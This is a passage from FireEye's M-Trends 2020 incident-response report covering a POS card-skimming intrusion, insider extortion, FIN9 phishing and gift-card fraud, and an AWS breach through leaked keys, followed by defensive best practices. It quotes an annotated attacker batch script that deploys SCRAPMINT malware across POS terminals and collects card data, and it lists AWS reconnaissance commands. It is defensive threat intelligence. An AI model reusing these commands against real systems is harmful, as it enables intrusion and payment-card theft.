demand start Service Account: LocalSystem
[Word Count: 16]

Figure 14. 
Batch script used to 
deploy SCRAPMINT 
(cfgx.bat).
[Word Count: 9]

for /f %%i in (C:\Windows\Temp\
dpllist.log) do net use \\%%i\c$ /
user:"<REDACTED>\<REDACTED>" 
<REDACTED>
[Word Count: 13]

Read in a list of hostnames from the file “dpllist.log” and mapped a network drive to the remote 
system.
[Word Count: 19]

type \\%%i\c$\Windows\Temp\silconfig1.dat 
>> C:\Windows\Temp\tmplog.dat
[Word Count: 4]

Read the content of “silconfig1.dat” on the remote system and copied it to the file “tmplog.dat” 
on the POS server. This file contained payment card information.
[Word Count: 26]

copy psemon10.dll \\%%i\c$\Windows\Temp\
psemon10.dll /Y
[Word Count: 5]

Copied the SCRAPMINT POS malware to the POS terminal, overwriting the file if it already 
existed.
[Word Count: 16]

copy cfgx.bat \\%%i\c$\Windows\Temp\cfgx.
bat /Y
[Word Count: 5]

Copied the “cfgx.bat” file that would launch the SCRAPMINT POS malware on the POS terminal.
[Word Count: 15]

ping 127.0.0.1 -n 1
Pinged the local loop back address to create a delay before the next set of commands were run.
[Word Count: 22]

del \\%%i\c$\Windows\Temp\silconfig1.dat
Deleted the “silconfig1.dat” file on the remote system.
[Word Count: 10]

process call create "cmd.exe /c C:\Windows\
Temp\cfgx.bat
[Word Count: 7]

Ran the “cfgx.bat” file to load the SCRAPMINT POS malware.
[Word Count: 10]

echo %%i >> C:\Windows\Temp\proclog.csv
Wrote the hostname of the remote system to the file “proclog.csv” on the POS Server.
[Word Count: 19]

net use \\%%i\c$ /delete
Deleted the connection to the remote POS terminal.
[Word Count: 12]

As noted, the batch script “cfgx.bat” (Fig. 14) was copied to each POS terminal 
along with a copy of the SCRAPMINT payment card scraping malware “psemon10.
dll”. “Cfgx.bat” executed the payment card scraping malware and specifying the 
output file, which in this case was named “silconfig1.dat”.
[Word Count: 46]

The attacker used a batch script to execute the following commands, attacker 
commands (Table 1), which deployed SCRAPMINT and pulled back files containing 
payment card information.
[Word Count: 26]

rundll32.exe C:\Windows\Temp\psemon.dll,workerInstance c:\Windows\temp\
[Word Count: 3]

For the duration of the compromise, the attacker periodically returned to 
the environment to copy and transfer payment card information out of the 
environment through the SQUIDGATE backdoor. The data from this incident 
appeared to be monetized through Joker’s Stash, a well-known card data shop 
that our analysts have seen used by prolific threat actors such as FIN6 and FIN7.
[Word Count: 60]

Joker’s Stash began 
operations in October 
2014. It sells payment 
card data through its 
website, which allows 
members to filter and 
purchase cards based 
on attributes such 
as brand, expiration 
date and location. 
The shop has been 
advertised on both 
Russian and English-
language forums. 
Card shops such as 
this typically work on 
a percentage basis, 
with the card shop 
operator taking a cut 
of the sales from the 
actors who obtained 
them.
[Word Count: 73]

Over the past year, FireEye Mandiant teams responded to an increasing number 
of incidents in which malicious insiders destroyed critical business systems, 
leaked confidential data, stalked employees and extorted and blackmailed the 
organizations they worked for. Some of the insiders were involved in economic 
espionage, some were motivated by greed and others vandalized their employer.
[Word Count: 55]

Consequently, organizations are increasingly paying attention to the business risk 
and impact of insider threats. Some malicious insiders brought public attention 
to their misdeeds by leaking data, broadcasting demands or making threats. 
Conversely, we saw some malicious insiders initially remain private, demanding 
money to prevent the release of stolen data. Some insiders acted with stealth to 
steal research data or intellectual property. The increasing number of incidents is 
particularly troubling for organizations of all sizes and missions because insiders 
are, by definition, those we normally trust most.
[Word Count: 87]

Mandiant engagements included investigations of malicious insiders who 
were third-party contractors, current employees and past employees. The 
roles they played included contract staff, IT admins, individual contributors, 
lawyers, academics and senior executives. Their true goals included stalking, 
blackmail, extortion, intellectual property theft and sabotage. The insider incident 
investigations were complex and solved through a combination of technical 
forensic analysis and traditional non-cyber investigative techniques.
[Word Count: 64]

Like traditional targeted attacks by external threat actors, malicious insider attacks 
are often carried out over time, with the insider usually taking steps to try to hide 
their malicious activity and remain undetected in the victim environment. And even 
when their malicious activity is detected, these insiders have sometimes taken 
steps to divert culpability through the use of other employees’ accounts.
[Word Count: 61]

Malicious insider incidents are likely to become an increasing trend given that 
they involve trusted access, high impact and low cost to execute, combined with 
organizational cultures with open trust models. In addition, we have seen the rise 
of successful extortion incidents that have been publicized.
[Word Count: 46]

Four types of insider threat—extortion, economic espionage, asset destruction, 
workplace stalking—appeared to trend with FireEye clients in 2019.
[Word Count: 18]

Trend 1: Extortion
Mandiant investigators observed an increasing number of insiders engaging 
in digital extortion schemes. Most often, the insiders attempted to extort their 
organization by threatening to publicly release stolen data if a monetary demand 
was not met. The ransom demand often demanded payment in a decentralized 
digital currency such as Bitcoin.
[Word Count: 53]

The ransom demand amount was usually commensurate with the perceived value 
of the stolen data. This helped ensure companies would consider payment. If the 
demanded amount was too large, the attacker would likely not get paid.
[Word Count: 36]

Most of the insider extortion cases we responded to followed a common approach. 
The attacker sent an email to a company executive indicating that some amount of 
sensitive data was stolen, provided proof of the possession of the stolen data and 
stated that the data would be released publicly on a certain date unless a payment 
was made.
[Word Count: 58]

Attributing an extortion demand to an insider is complicated. An organization 
needs to determine if the extortion demand is real by determining if the data is 
authentic. If the data is authentic, the organization needs to understand where 
the data came from and how it was obtained. A broad investigation of the 
environment is sometimes required to determine who may be behind the incident.
[Word Count: 64]

When authentic data accompanies an extortion demand, organizations 
must ask:
[Word Count: 10]

•	Did the data come from inside the organization?
[Word Count: 9]

•	Is there evidence of an intrusion and was the data stolen?
[Word Count: 12]

•	Were legitimate credentials used to access the data, and if so, were those
[Word Count: 14]

credentials stolen by a threat actor or used by the employee?
[Word Count: 11]

Sometimes an extortionist attempts to deceive the victim organization. In one 
case, an extortionist demanding money claimed to be an outside attacker that was 
collaborating with an insider. We later learned the extortionist was an employee 
trying to frame a coworker. In another situation, the extortionist claimed to have 
compromised the credentials of an employee. This was likely an attempt by the 
insider to create an alibi in case they were later caught.
[Word Count: 73]

There are several competing priorities in an insider investigation. An organization 
must validate the risk exposure, establish and execute a communication strategy 
with the extortionist and prevent further access to the network—all while under an 
aggressive threat actor-imposed deadline. Immediate determination of whether an 
incident was caused by an internal or external actor is not often possible without a 
proper forensic investigation.
[Word Count: 62]

The obvious next question is whether a victim organization should pay the demand. 
Each scenario is unique and needs to be approached differently. Even if a victim 
organization pays the demand, there is always a chance the attacker will release 
the data anyway to media, social networking platforms, file sharing sites and 
underground forums.
[Word Count: 54]

In one case, an individual claimed to have access to a large amount of sensitive company data. The 
individual provided excerpts of confidential data to the victim organization as proof and threatened to 
publish the rest of the stolen data unless a payment was made. The extortionist allowed the organization to 
make partial Bitcoin payments and allowed a few deadlines to slip. Analysis showed that after each Bitcoin payment, 
the extortionist attempted to prevent detection by using a third-party service to launder the Bitcoin payment to break 
the connection between the payment source and destination.
[Word Count: 95]

Trend 3: Asset Destruction
Mandiant responders were engaged by a client at which an executive had received 
an extortion message via an anonymous email. The attacker had indicated that 
they possessed access to the client’s internal network and had the ability to cause 
outages. A significant payment was demanded in Bitcoin. As proof, the attacker 
referred to an unexplained outage of a critical security system that occurred a few 
weeks earlier.
[Word Count: 71]

1 U.S. Senate (November 18, 2019). Threats to the U.S. Research Enterprise: China’s Talent Recruitment Plans.
[Word Count: 16]

Conclusion
Organizations across the world are investing more resources to detect and protect 
their most critical assets and crown jewels from malicious insiders. Unfortunately, in 
many cases, these investments come after an event which caused organizational, 
brand or reputational harm. The impact of an insider betraying an organization’s 
trust can be devastating for organizations of all sizes. We expect to see this trend 
to continue into 2020 and beyond.
[Word Count: 69]

In 2019, Mandiant experts responded to intrusions we assessed with a high-level 
of confidence to be evolving FIN9 intrusions. These were notable due to the 
attacker’s shift to targeting IT service providers. This increased their impact and 
reach across multiple organizations compared to past activity. The attackers 
expanded their monetization actions by targeting corporate reward systems to 
steal gift cards. Finally, the attackers continue to expand and evolve their toolset 
with a distinct focus on publicly available tools and compromised legitimate 
access. Mandiant analysts expect to see these efforts continue due to their 
lucrative nature and favorable attacker outcomes.
[Word Count: 99]

First Stage: Targeting IT Service Providers
[Word Count: 6]

The embedded link in the phishing email (Fig. 15) mimicked those created by 
legitimate secure email portals, but directed users to a phishing kit. The phishing 
kit was hosted at organization-specific subdomains of the attacker-controlled 
domain internal-message[.]app. This phishing page was built using resources from 
the publicly available LUCY Phishing Software platform.
[Word Count: 52]

Figure 15. 
Sample phishing 
email received by IT 
service provider.
[Word Count: 10]

You have received an encrypted message from HR Department
[Word Count: 9]

The HR Department has sent you an encrypted message.  You can access it under the following link:
[Word Count: 17]

https://                                       /internal-message/a34fc9f417efef3c2
[Word Count: 2]

Please sign in with your network username and password to decrypt the message.
[Word Count: 13]

Some of the content in this message couldn’t be downloaded because you’re working offline or aren’t connected to a network.
[Word Count: 20]

Figure 16. 
Gift card attack 
lifecycle.
[Word Count: 6]

Initial Compromise/Establish Foothold
Internal Reconnaissance
Complete Mission
[Word Count: 7]

• ScreenConnect
• EMCO Remote Installer
• CleverControl
• SentryPC
• Teramind
• Virtual Network Computing (VNC)
• Splashtop Streamer
[Word Count: 20]

• Compromised third party credentials and systems
• Corporate VPN infrastructure
[Word Count: 11]

• ProcDump
• PsExec
• Mimikatz
• O365 eDiscovery portal
[Word Count: 10]

Figure 17. 
Attacker subverting 
employee rewards 
system.
[Word Count: 7]

End-Stage Operations: Gift Card Targeting
[Word Count: 5]

Consistent with prior FIN9 operations, some compromised organizations had their 
valid process for issuing gift cards subverted to create fraudulent gift cards for 
the attacker (Fig. 17). In other instances, the compromised organization was not 
in the gift card supply chain, but the attacker was still able to obtain gift cards 
by exploiting corporate employee rewards systems. In one case, after harvesting 
user credentials, the attacker submitted employee award nominations and then 
approved them from approver-privileged accounts that were also compromised. 
These employee rewards points were then traded in for gift cards.
[Word Count: 92]

In one Mandiant Incident Response case, AWS access keys were compromised 
from a GitHub repository and leveraged to access the victim’s AWS 
environment.
[Word Count: 23]

First Stage: Targeting GitHub Repository
[Word Count: 5]

Investigations into the early stages of the attack suggested the attacker initially 
obtained credentials to the victim’s GitHub code repository, which was not 
protected by MFA. Once the attacker was able to gain access to the GitHub 
repository with a known account, the attacker acquired a set of IAM user access 
keys by searching the commit history. The IAM user access keys were used as 
long-lived credentials for applications that interacted with and performed API 
requests against AWS services in the victim’s environment.
[Word Count: 83]

Second Stage: Initial Access / Reconnaissance / Establish Foothold
After the attacker acquired the IAM access keys, they were able to access the 
victim’s AWS environment using the AWS CLI from a virtual server located in 
the Netherlands. The attacker then utilized the AWS CLI to interact with the 
AWS environment (Table 2).
[Word Count: 53]

The attacker then authenticated to the EC2 instance to review the contents of the 
nine attached EBS volumes. Within an hour, the VPC flow logs recorded a large 
volume of data being transferred via SSH to the virtual server in the Netherlands. 
This was the first recorded high-volume data transfer via SSH, and it corresponded 
to the first data theft by the attacker. Shortly after the data transfer, the EBS 
snapshots were unmounted from the instance and deleted from the account.
[Word Count: 81]

The attacker then targeted the victim’s AWS Relational Database Service (RDS) 
instances. Specifically, the attacker targeted the MySQL database containing 
user credentials for a service provided by the victim organization. VPC flow logs 
recorded traffic between the attacker’s EC2 instance and the RDS database. Again, 
a high volume of data was transferred between the two systems, and subsequently 
transferred to the virtual server in the Netherlands. This was consistent with the 
attacker staging data on their EC2 instance and then transferring it to their server 
in the Netherlands.
[Word Count: 88]

Once the attacker had successfully transferred the data, the attacker terminated 
the EC2 instance. This removed valuable forensic artifacts because the EC2 
instance was not recoverable. The attacker did not remove the attacker-created 
credentials, which would have permitted them to access additional data in the 
database or EBS volumes.
[Word Count: 49]

aws s3api list-buckets
Lists all S3 buckets in a region
[Word Count: 10]

aws ec2 describe-instances
Lists all of the ec2 instances
[Word Count: 9]

aws ec2 describe-security-groups
Describes all or specified security groups
[Word Count: 9]

aws ec2 describe-snapshots
Describe all snapshots available or snapshots available to 
user
[Word Count: 12]

aws ec2 describe-volumes
Describes all or specified Elastic Block Store volumes
[Word Count: 11]

aws ec2 describe-db-instances
Describes all or specified AWS account instances
[Word Count: 10]

Table 2. 
Reconnaissance 
commands 
executed by 
attacker.
[Word Count: 7]

Summary
AWS and other CSPs enable organizations to rapidly develop, scale and deploy 
code and systems. Once an attacker obtains credentials to a cloud infrastructure, 
the same tools that empower the organization also enable the attacker to rapidly 
target and exploit cloud environments. The ability to access these cloud-native 
tools also removes the need for sophisticated backdoors or custom tooling. 
Everything the attacker needs is publicly accessible and provided by the CSP, 
usually in the form of a CLI.
[Word Count: 79]

MFA not enforced on GitHub repository user accounts or 
for AWS IAM users
[Word Count: 13]

Pitfall Attackers target code repositories to gather pertinent information about a 
corporation’s cloud or on-premise environment, and to obtain credentials. In at least 
one case, multi-factor authentication was not enforced for the victim’s user accounts 
on GitHub repository. The victim also had console password enabled for an IAM user 
without enforcing MFA.
[Word Count: 52]

Best Practice Organizations should enforce MFA for all user accounts that have 
access to code repositories and AWS accounts. Enabling and enforcing MFA will 
enhance the overall security of these accounts and reduce the risk that an attacker 
will be able to use a compromised account for nefarious activity. An organization 
should disable any inactive IAM users until MFA is enabled.
[Word Count: 61]

The second factor may be a hard or soft token. Organizations should avoid using 
second-factor mechanisms that are stored on the user’s PC. Instead, consider soft 
tokens that are deployed onto mobile devices.
[Word Count: 33]

For additional hardening, organizations should require MFA not only for console 
access, but also for CLI access. Organizations should restrict both console and CLI 
access to known trusted IP ranges or IP addresses.
[Word Count: 33]

Pitfall While long-lived IAM user credentials are used for application functionality, 
such user access keys can increase the attack surface of an organization’s AWS 
environment.
[Word Count: 25]

Best Practice Organizations should rotate IAM user access keys every 90 days to 
limit attacker access to AWS. When developing an application, IAM roles should be 
used to retrieve temporary credentials to interact with AWS resources within the 
environment. AWS provides features to reduce the use of long-lived IAM credentials 
for application purposes in their cloud platform. An organization should be using 
IAM roles for EC2 instance profiles if they intend to have an application on an 
EC2 instance interact with different AWS services, such as S3, Lambda functions, 
Relational Database Service.
[Word Count: 92]

Using IAM roles rather than IAM access keys to perform AWS API requests has 
multiple benefits. Once transitioned, an organization’s AWS administrator will 
not be required to rotate credentials, because the AWS EC2 service will pass 
temporary credentials to the metadata service of the underlying EC2 instance. 
AWS rotates the credentials in the EC2 metadata service every one to six hours. 
As an added benefit, an organization can easily restrict which role an IAM user can 
assign to an EC2 instance profile during the launch process to prevent the user 
from gaining elevated privileges.
[Word Count: 94]

Pitfall When IAM user accounts have an overly permissive IAM role, they are at 
risk for both inadvertent or deliberate activity outside of their intended purpose or 
scope. In at least one instance, a compromised account has been observed with the 
Administrator Access policy attached, which granted full administrative access to 
the AWS account.
[Word Count: 54]

Best Practice Organizations should follow the principle of least privilege 
when assigning IAM users and roles. To abide by the principle of least privilege, 
organizations should limit the number of users within the organization with an IAM 
role that has administrative privileges. An organization should strive to reduce all 
permanent privileged role assignments and conduct periodic entitlement reviews 
on IAM users, roles and policies. AWS provides native services, such as AWS access 
advisor to audit IAM roles for service access, assist with removal of unnecessary 
permissions and set appropriate permissions across different environments.
[Word Count: 93]

Insufficient detection capabilities
Pitfall Organizations may have insufficient detection capabilities and SIEM use 
cases established at the time of an incident.
[Word Count: 21]

Best Practice Organizations should develop SIEM use cases to help detect threats 
impacting cloud assets and services. An organization should identify the most 
common targeted threats impacting the AWS environment, and identify activity in 
AWS that would be considered anomalous. The use cases should sufficiently cover a 
variety of assets and services.
[Word Count: 52]

•	 New IP address performing an anomalous amount of API activity outside an approved IP range and
[Word Count: 17]

performing reconnaissance commands on the AWS environment
[Word Count: 7]

•	 New IP address creating an IAM user with console and programmatic access
[Word Count: 13]

•	 Creating snapshots of large EBS volumes
[Word Count: 7]

•	 New IP address creating an EC2 instance and attaching security group
[Word Count: 12]

•	 New IP address and user accessing sensitive database
[Word Count: 9]

Storing credentials in plaintext within a GitHub repository
[Word Count: 8]

Pitfall Organizations may not be scanning for exposed credentials or preventing 
them from being committed to the GitHub code repository.
[Word Count: 20]

Best Practice Organizations should use a professional or open-source credential 
scanning solution to monitor and prevent inadvertent exposure of credentials. 
GitHub provides a professional token scanning solution that will analyze code for 
exposed credentials. The GitHub token scanning service will allow an organization 
to create regular expressions to match specific credential patterns and then alert 
the user or security team after a credential has been committed.
[Word Count: 66]

GitHub Enterprise can create pre-receive hooks, which allow a script or credential 
scanning tool to be executed before acceptance of the commit. An organization 
can use these pre-receive hooks and webhooks to execute an open-source 
tool such as “git-secrets” or “detect-secrets” before allowing the commit, to 
prevent any code containing an exposed secret from being accepted into a code 
repository.
[Word Count: 60]

While the threat landscape is evolving, new is not replacing old. Although we have 
observed new malware families, many of these attackers are the usual suspects we 
have seen over the years using familiar types of attack techniques with malware 
based on a handful of known malware families.
[Word Count: 48]

And these threats and activities never stop. There are more active groups now 
than ever before, with significant APT and FIN activity. These groups are using a 
combination of custom intrusion tools and publicly available tools, typically in the 
same parts of the attacker lifecycle.
[Word Count: 45]

While targeted industries and overall motivations have remained consistent, we are 
seeing a marked expansion of threat actor goals, including new ways to monetize 
intrusions and overall diversification in threat activity. This requires incident 
responders to be prepared for more scenarios, both familiar and unfamiliar.
[Word Count: 45]

Perhaps most importantly is the good news: attacks are being detected and 
responded to more quickly. The global median dwell time for 2019 was 56 days—
less than two months! Also of note: more victims were notified by an outside 
party, reversing a four-year trend where more organizations were identifying 
compromises on their own.
[Word Count: 54]

Many of the stats in M-Trends 2020 show that both the industry and 
organizations are getting better at cyber security, but there is no single reason 
why. Perhaps more vendors and more awareness are leading to better visibility 
across the security spectrum. Or organizations are simply investing more in their 
cyber security programs.
[Word Count: 53]

And of course, FireEye will continue to publish M-Trends in the years to come, to 
improve our collective security awareness, knowledge and capabilities.
[Word Count: 23]

FireEye, Inc. 
601 McCarthy Blvd. Milpitas, CA 95035 
408.321.6300/877.FIREEYE (347.3393)
info@FireEye.com
[Word Count: 11]

To learn more about FireEye, visit: www.fireeye.com
[Word Count: 7]

About FireEye, Inc.
FireEye is the intelligence-led security company. Working as a 
seamless, scalable extension of customer security operations, FireEye 
offers a single platform that blends innovative security technologies, 
nation-state grade threat intelligence, and world-renowned Mandiant® 
consulting. With this approach, FireEye eliminates the complexity 
and burden of cyber security for organizations struggling to prepare 
for, prevent, and respond to cyber attacks. FireEye has over 7,700 
customers across 67 countries, including more than 50 percent of the 
Forbes Global 2000.
[Word Count: 79]

© 2020 FireEye, Inc. All rights reserved. FireEye 
and M-Trends are registered trademarks of FireEye, 
Inc. All other brands, products, or service names 
are or may be trademarks or service marks of their 
respective owners. 
M-EXT-RT-US-EN-000277-03
[Word Count: 36]

Total Paragraphs: 329